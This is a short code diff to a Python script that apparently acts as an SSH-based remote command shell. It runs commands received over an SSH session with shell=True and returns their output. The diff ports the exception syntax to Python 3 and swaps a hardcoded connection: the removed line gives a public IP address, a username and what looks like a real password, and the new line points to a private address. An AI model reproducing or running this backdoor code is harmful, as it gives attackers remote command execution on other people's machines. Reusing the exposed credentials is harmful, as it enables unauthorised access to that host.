@@ -17,9 +17,9 @@ def ssh_command(ip, user, passwd, command):
             try:
                 cmd_output = subprocess.check_output(command, shell=True)
                 ssh_session.send(cmd_output)
-            except Exception,e:
+            except Exception as e:
                 ssh_session.send(str(e))
         client.close()
     return
 
-ssh_command('205.166.94.4', 'ibro', '8tnLfx1J270lg', 'ClientConnected')
+ssh_command('10.0.0.150', 'ibro', 'ibro', 'ls')
